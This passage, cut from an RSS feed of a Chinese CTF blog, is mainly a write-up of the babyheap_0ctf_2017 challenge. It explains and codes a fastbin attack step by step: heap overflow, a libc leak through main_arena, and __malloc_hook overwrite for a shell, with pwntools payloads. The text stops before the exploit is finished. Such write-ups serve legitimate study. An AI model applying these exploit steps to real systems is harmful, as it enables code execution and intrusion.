punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;%d&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;buffer&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&gt;&gt;&lt;/span&gt; j&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; n &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                offset &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;sprintf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;output &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; offset&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;_&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;feof&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;fp&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            offset &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;sprintf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;output &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; offset&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34; &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    offset &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;sprintf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;output &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; offset&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&amp;#125;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%s\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; output&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;fclose&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;fp&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;此处有 &lt;code&gt;fopen(&amp;quot;key&amp;quot;,:&amp;quot;rb&amp;quot;)&lt;/code&gt;  要打开文件 (rb 以读写方式打开一个二进制文件)，不能让其为空，手动创建一个 key 文件，题目说明 key 为 &lt;code&gt;CTFshow&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;创建完成后用 gcc 编译，执行程序&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPhJc7Q.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://vvwwvv.cn/2023/09/12/pwn/%E5%88%B7%E9%A2%98/BUUCTF/babyheap_0ctf_2017/</guid>
            <title>babyheap_0ctf_2017，fastbin.attack之double.free</title>
            <link>https://vvwwvv.cn/2023/09/12/pwn/%E5%88%B7%E9%A2%98/BUUCTF/babyheap_0ctf_2017/</link>
            <category>pwn</category>
            <category>fastbin.attack</category>
            <pubDate>Tue, 12 Sep 2023 21:08:15 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;由于断断续续写了好久加上自身水平不足导致可能存在逻辑上的错误等等，如有错误，还望指出&lt;/p&gt;
&lt;p&gt;&lt;s&gt;先前的理解&lt;br /&gt;
改变 index4 的大小后被认为是释放了，然后分配 fastbin (小于 0x80 的在这里) 根据后进先出，分配被认为是释放的 index4 为 index2，在将 index 的大小改回去，此时便让两个 index2 和 index4 都指向了同一个 chunk&lt;/s&gt;&lt;/p&gt;
&lt;p&gt;&lt;s&gt;通过堆溢出，用还未释放的 index0 来溢出改变 chunk2 的 fd 的地址为 chunk4&lt;br /&gt;
，原来应该通过释放由于后进先出通过 free1，free2 的顺序，fastbin 中是由 chunk2-&amp;gt;chunk1, 溢出后变为 chunk2-&amp;gt;chunk4，此时视为 chunk4 被释放放在 fastbin 中，因为需要让两个 index 指向同一个 chunk，就需要在重新申请堆块 chunk1 和 chunkl2 后再申请 chunk4，由于再 fastbin 中，是后进先出（在 fastbin 中：chunk2-&amp;gt;chunk4）所以给 index1 分配的是原来的 chunk2，而 index2 就被分配了 chunk4，&lt;/s&gt;&lt;/p&gt;
&lt;p&gt;&lt;s&gt;后面 mallco (0x80) 仍然分配的是 chunk4（我认为应该是原本就是指向 chunk4，且已经修改了大小，所以申请时能够通过 “chunksuize 与其对应的 fastbin_index 匹配” 这是一个节省资源的机制，给相同大小的直接分配，不用去再合并块等等），这时 index2 与 index4 都指向了 chuink4，再次释放 free4，chunk4 就进入 unsortbin（unsortedbin 中只有一个块时，就会使 fd 和 bk 指针指向同一个地址，即  &lt;code&gt;main_arena+88, main_arena相对libc固定偏移0x3c4b20,不同libc版本偏移不同&lt;/code&gt; ，因此  &lt;code&gt;libc=main_area_88-88-0x3c4b20&lt;/code&gt; ）&lt;/s&gt;&lt;/p&gt;
&lt;p&gt;最终利用：&lt;br /&gt;
&lt;strong&gt;malloc_hook 是一个 libc 上的函数，如果指针不为空则会执行其指针指向的函数，通过这个来 getshell&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;1查看程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1查看程序&#34;&gt;#&lt;/a&gt; 1. 查看程序&lt;/h1&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/12/pP2uqmV.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;发现保护全开了，利用 ida 查看一下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/12/pP2uvY4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;挨个查看&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/12/pP2K961.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;switch 里的判断条件（用来选择）：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/12/pP2KKXt.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;case 1（allocate，分配 chunk）：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/12/pP2KUcn.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;case 2（fill，进行内容填充，存在堆溢出）：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/12/pP2MED0.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;case 3（free，释放 chunk）：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/12/pP2MM8J.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;case 4（dump，输出内容，可以以此获取 main.arena88）：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/12/pP2MN5D.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;2漏洞分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2漏洞分析&#34;&gt;#&lt;/a&gt; 2. 漏洞分析&lt;/h1&gt;
&lt;p&gt;1. 由于 unsorted bin 中只有一个块时会将 fb 和 bk 指针指向 main.arena+88 处，而 libc 距 main.aerna-offset（该 offset 是一个固定值，只是不同版本的 libc 里不同）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;libc_base=main_arena_88-offset-88&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2. 因此我们要使一块 chunk 去到 unsorted bin 再用 dump 泄露出来，这就需要我们让两个 index 来指向同一个 chunk，一个释放掉使 chunk 到 unsorted bin，另一个就可以通过 dump 来泄露 main.arena+88 的地址&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;要让两个 index 指向同一个 chunk，就需要借助 free 来实现，通过 &lt;strong&gt;free 两个 index (chunk1,chunk2)&lt;/strong&gt; ，使其到 fastbin 中，其会按照后进先出原则，再通过溢出&lt;strong&gt;使一个 index2 的 fd 指向 chunk4&lt;/strong&gt;，将原来的 fastbin 中&lt;strong&gt; chunk2-&amp;gt;chunk1 变换为了 chunk2-&amp;gt;chunk4&lt;/strong&gt;，此时 mallco （index1 的大小）时会将 chunk2 分配给 index1，而 mallco （index2 的大小）会将 chunk4 分配给 index2【注意此时要修改 chunk4 的 size 和 index2 的大小一致】，然后通过溢出 index3 将 chunk4 的 size 值恢复，然后再 mallco （index4 的大小）再释放，这时 chunk4 就会进入 unsorted bin , 并且 index2 也指向了 chunk4，可以通过 dump（index2）来泄露 main.arena+88 的地址&lt;/p&gt;
&lt;p&gt;4.fastbin attack&lt;/p&gt;
&lt;p&gt;原理：&lt;/p&gt;
&lt;p&gt;通过 double free 利用 ：释放 chunk1 和 chunk2 然后 fastbin 里就会形成&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/13/pP22dJO.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;利用 double free 来再次释放 chunk1，会变成：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/13/pP2fPJK.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;此时申请后分配 chunk1：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/13/pP2fNoq.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;接着需要写入前面分配的 chunk1 来改变 fd 指向到想要写入的地址（此处是因为 free 了两次所以同一个 chunk1 一个再 heap 中，另一个在 fastbin 里，通过 heap 写入就能改写 fastbin 里的 fd 指向）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/13/pP2IUuF.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;接着 mallco chunk2 和 mallco chunk1，此时 fastbin 指向新指向的 chunk3&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/13/pP2IqKS.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;此时再 mallco 一次即可申请到新的 chunk3，然后就可以进行改写内容&lt;/p&gt;
&lt;p&gt;回到题目：&lt;/p&gt;
&lt;p&gt;通过泄露的地址来获得 libc 的基地址， &lt;strong&gt;libc 上的函数 libc_mallco，该函数会调用 mallco hook，是 libc 上的一个函数指针，若该指针不为空则执行它指向的函数&lt;/strong&gt; ，我们可以以此来 getshell，用 fastbin attack 将一个 libc 上的地址放入 fastbin 链表中，然后通过 malloc （），将该地址分配，这样就可以改写 libc 的内容，通过 mallco hook 来 getshell（写入地址后再次 mallco 即可执行 mallco hook）&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3QuY3Nkbi5jbi9JelVrVg==&#34;&gt;http://t.csdn.cn/IzUkV&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;此时 chunk4 在 unsorted bin 中，我们需要 mallco 0x60，再 free 使其放入到 fastbin 中，因为前面 index2 已经指向了 chunk4，所以通过 index2 写入要修改的地址即可，然后 mallco 2 次，一个是 chunk4，一个就是新的 chunk 为要修改的 mallco hook&lt;/p&gt;
&lt;h1 id=&#34;3漏洞利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3漏洞利用&#34;&gt;#&lt;/a&gt; 3. 漏洞利用&lt;/h1&gt;
&lt;p&gt;1. 先利用 allocate 得到 chunk&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;allocate(0x10)  index0
allocate(0x10)  index1
allocate(0x10)  index2
allocate(0x10)  index3
allocate(0x80)  index4
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;2. 利用 free，使后续的两个 index 可以指向同一个 chunk&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;free（1）
free（2）
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;【注意修改 glibc 版本】&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;patchelf --set-interpreter ~/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so --set-rpath ~/Tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ ~/Downloads/buuctf/babyheap_0ctf_2017
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看此时的堆（glibc 2.26 版本以后会不一样），可以发现地址都是对齐的：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/13/pPRAMSP.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;查看 bins，此时是 chunk2-&amp;gt;chunk1：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/13/pPRAtFs.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;查看该 heap 的内容，由下面的图也可以发现地址只有第一个字节不同，所以后面溢出修改一个字节为 0x80 就好：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/13/pPRAck9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;溢出&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#溢出&#34;&gt;#&lt;/a&gt; 溢出&lt;/h2&gt;
&lt;p&gt;利用 index0 来溢出改写 index2 的 fd（不用 index1 是因为 index1 也被释放），利用 index3 来改写 index4 的 size&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;span&gt;n&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;填充index0的fd和bk（因为此处是作为存储数据来用，并不是存地址）&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload1&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x21&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;index1的pre_size和size位和fd、bk&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload1&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x21&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;index2：pre_size、size、fd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;length&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;填充 index0进行溢出&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;填充index3&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload2&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x21&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;溢出修改index4的size位&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;length&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;index2 的 fd 位 0x80 是因为堆始终是 &lt;strong&gt;4KB 对齐&lt;/strong&gt; 的，所以 index4 的第一个字节 (小端序) 必定是 80（前面的 index0~3 都占了 0x20）&lt;/p&gt;
&lt;p&gt;【这里解释修改 index4 的 size 位，这里 index4 对应 chunk4】&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;查看其 chunksize 与相应的 fastbin_index 是否匹配，
实际上 chunksize 的计算方法是 victim-&amp;gt;size &amp;amp; ~(SIZE_BITS))，
而它对应的 index 计算方法为 (size) &amp;gt;&amp;gt; (SIZE_SZ == 8 ? 4 : 3) - 2，
这里 64位的平台对应的 SIZE_SZ 是8，则 fastbin_index 为 (size &amp;gt;&amp;gt; 4) - 2，
那么我们将 small chunk 的 size 域改写成 0x21 即可。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;3. 构造两个 index 指向同一个 chunk（index2，index4 都指向 chunk4）&lt;/p&gt;
&lt;p&gt;由于前面的溢出 index2 导致对应的 chunk2 的 fd 指向了 chunk4（此时 chunk2 在 fastbin 表里，所以使 chunk4 也在 fastbin 表中），此时 fastbin-&amp;gt;chunk2-&amp;gt;chunk4&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;allocate(0x10)  //index1，此时会将chunk2分配给index1
allocate(0x10)  //index2，此时会将chunk4分配给index2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此时就有两个 index 指向同一个 chunk 了，接着改回来原来的 index4 的大小&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;payload3=p64(0)+p64(0)
payload3+=p64(0)+p64(0x91)
fill(3,length(payload3),payload3)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;接着给 index4 分配 chunk4（因为前面 index2 回收 chunk4 没有改变 index4 指向的 chunk 地址，所以给 index 分配的仍然是 chunk4）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;allocate(0x80) //给index4分配chunk4
free(4)  //释放chunk4，因为大于等于0x80，所以进入unsorted bin中
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此时 chunk4 的 fd 和 bk 就指向 &lt;code&gt;main_arena+88&lt;/code&gt;  处&lt;/p&gt;
&lt;p&gt;4. 泄露 &lt;code&gt;main_arena_88&lt;/code&gt;  地址，计算得到 libc_base（ &lt;strong&gt;main_arena 相对 libc 固定偏移 0x3c4b20, 不同 libc 版本偏移不同&lt;/strong&gt; ）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;dump(2)
main_arena_88=u64(p.recvuntil(&#39;\x7f&#39;)[-6:]+&#39;\x00\x00&#39;)
libc_base=main_arena_88-0x3c4b78   (0x3c4b0+88,一般2.23_64的偏移都是这个，不同libc版本会有不同
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;5. 构造 &lt;code&gt;fake_chunk&lt;/code&gt; ，使其能够溢出到 &lt;code&gt;malloc_hook&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;计算 fake_chunk 的地址（ &lt;code&gt;malloc_hook&lt;/code&gt;  就在 &lt;code&gt;main_arena&lt;/code&gt;  的上面，我们需要找一个 &lt;code&gt;malloc_hook&lt;/code&gt;  附近能够构造 chunk 的地址作为 &lt;code&gt;fake_chunk&lt;/code&gt; ）：&lt;/p&gt;
